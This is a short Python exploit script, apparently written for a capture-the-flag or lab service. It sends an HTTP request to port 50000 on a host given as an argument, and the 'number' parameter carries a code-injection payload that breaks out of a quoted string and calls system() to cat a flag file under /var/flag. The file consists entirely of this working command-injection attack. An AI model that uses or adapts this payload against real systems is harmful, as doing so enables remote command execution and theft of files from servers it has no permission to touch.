#!/usr/bin/python3
import sys


def arg_reciever():
    argv = sys.argv
    host = argv[1]
    args = argv[2:]
    return host, args


HOST, args = arg_reciever()

# rest of the code
import requests

url = f"http://{HOST}:50000/?number=%27;system(%27cat%20/var/flag/00000000000000000000000000000000%27);%27"
print(requests.get(url).text)
